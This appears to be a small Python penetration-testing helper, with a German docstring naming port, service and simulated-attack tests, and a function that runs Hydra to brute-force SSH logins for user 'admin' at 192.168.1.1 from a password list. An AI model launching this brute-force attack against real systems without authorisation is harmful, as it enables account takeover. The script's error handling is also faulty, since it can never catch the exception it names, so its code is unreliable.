'''
Methoden:
test_port_security(target_ip, ports): Überprüfung offener Ports.
test_service_vulnerabilities(target_ip, services): Testet Dienste auf Sicherheitslücken.
simulate_attack(target_ip, payload): Simuliert Angriffe in einer kontrollierten Umgebung.

'''
import subprocess


def run_hydra():
    """Hydra"""
    try:
        result = subprocess.run(
            ['hydra', '-l', 'admin', '-P', 'passwords.txt', '192.168.1.1', 'ssh'],
            capture_output=True,
            text=True
        )
        print("Hydra output:")
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f"Command failed with error: {e}")